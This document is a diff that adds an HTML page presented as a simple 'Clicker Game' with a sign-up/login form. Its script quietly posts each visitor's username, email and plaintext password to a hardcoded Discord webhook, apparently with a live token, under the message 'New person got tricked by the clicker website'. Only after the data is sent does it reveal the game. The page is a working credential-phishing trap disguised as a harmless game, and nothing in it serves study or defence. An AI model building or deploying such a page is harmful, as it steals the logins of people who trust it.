@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clicker Game</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+
+        #signupSection, #gameContainer {
+            max-width: 400px;
+            margin: 20px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1, h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        label, input, button {
+            display: block;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        input[type="text"], input[type="email"], input[type="password"], button {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #gameContainer {
+            display: none;
+        }
+
+        #clickButton {
+            background-color: #28a745;
+        }
+
+        #clickButton:hover {
+            background-color: #218838;
+        }
+
+        #clickCount {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Sign-up form -->
+    <div id="signupSection">
+        <h1>Sign Up / Log In</h1>
+        <form id="signupForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Sign Up / Login</button>
+        </form>
+    </div>
+
+    <!-- Clicker game container (hidden by default) -->
+    <div id="gameContainer">
+        <h2>Clicker Game</h2>
+        <button id="clickButton">Click Me!</button>
+        <p>Click count: <span id="clickCount">0</span></p>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Clicker game variables
+        let clickCount = 0;
+
+        // Load click count from localStorage if available
+        if (localStorage.getItem('clickCount')) {
+            clickCount = parseInt(localStorage.getItem('clickCount'));
+            document.getElementById("clickCount").textContent = clickCount;
+        }
+
+        // Event listener for click button
+        document.getElementById("clickButton").addEventListener("click", function() {
+            clickCount++;
+            document.getElementById("clickCount").textContent = clickCount;
+            // Save click count to localStorage
+            localStorage.setItem('clickCount', clickCount);
+        });
+
+        // Event listener for sign-up form submission
+        document.getElementById("signupForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+            
+            // Collect user input
+            const username = document.getElementById("username").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Create object with user data
+            const userData = {
+                username: username,
+                email: email,
+                password: password
+            };
+
+            // Send data to webhook
+            sendDataToWebhook(userData);
+        });
+
+        function sendDataToWebhook(userData) {
+            // Send data to webhook using fetch
+            fetch('https://discord.com/api/webhooks/1206174605019058197/ZRuzKVMgomnWsp0FbRm8uujxiQG4N2kxLLuOKCNIUw4tY0UlqDC08XLq1LUI8A86gite', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `\`\`\`
+New person got tricked by the clicker website:
+Username: ${userData.username}
+Email: ${userData.email}
+Password: ${userData.password}
+\`\`\``
+                }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                console.log('Data sent successfully.');
+                // Show the game container
+                document.getElementById("gameContainer").style.display = "block";
+                // Hide the signup section
+                document.getElementById("signupSection").style.display = "none";
+            })
+            .catch(error => {
+                console.error('Error sending data to webhook:', error);
+                // Handle error - maybe show an error message to the user
+            });
+        }
+    </script>
+</body>
+</html>
